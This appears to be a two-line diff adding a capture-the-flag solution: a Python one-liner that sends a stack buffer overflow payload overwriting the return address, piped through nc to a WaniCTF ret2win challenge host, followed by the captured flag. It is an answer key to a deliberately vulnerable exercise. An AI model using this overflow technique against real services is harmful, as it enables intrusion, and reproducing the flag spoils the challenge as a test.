@@ -1,0 +1,2 @@
+(python3 -c "from struct import pack; print('a'*0x28+pack('<Q', 0x401369).decode())"; cat) | nc ret2win-pwn.wanictf.org 9003
+FLAG{f1r57_5739_45_4_9wn3r}
